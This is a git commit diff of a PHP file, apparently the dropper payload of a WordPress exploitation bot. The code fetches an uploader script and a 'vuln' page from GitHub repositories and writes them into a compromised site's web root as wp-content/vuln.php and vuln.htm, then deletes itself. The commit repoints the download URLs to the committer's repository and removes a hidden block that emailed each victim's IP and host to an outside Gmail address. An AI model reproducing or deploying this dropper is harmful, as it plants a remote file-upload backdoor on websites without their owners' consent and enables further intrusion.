5fc9ee971cdeeeb60469a463b038020850c653d9
oussemabm <theseedynasty@outlook.com>
2018-10-24 16:25:20 +0100

    Add files via upload

--- settings_auto.php
+++ settings_auto.php
@@ -1,4 +1,4 @@
-<title>Vuln!! patch it Now!MrSpyUp!!</title>
+<title>Vuln!! patch it Now!!</title>
 <?php
 function http_get($url){
 	$im = curl_init($url);
@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php');
+$text = http_get('https://raw.githubusercontent.com/oussemabm/python/master/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/vuln.txt');
+$text2 = http_get('https://raw.githubusercontent.com/oussemabm/python/master/vuln.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
@@ -33,15 +33,4 @@ echo "done .\n " ;
 
 @unlink(__FILE__);
 ?>
-<?php
-$ip = getenv("REMOTE_ADDR");
-$ra44 = rand(1, 99999);
-$subj98 = " Bot V3 Rzlt |$ip";
-$email = "sellerolux@gmail.com";
-$from = "From: Result<botv3@mrspybotv3.com";
-$a45 = $_SERVER['REQUEST_URI'];
-$b75 = $_SERVER['HTTP_HOST'];
-$m22 = $ip . "";
-$msg8873 = "$a45 $b75 $m22";
-mail($email, $subj98, $msg8873, $from);
-?>
+
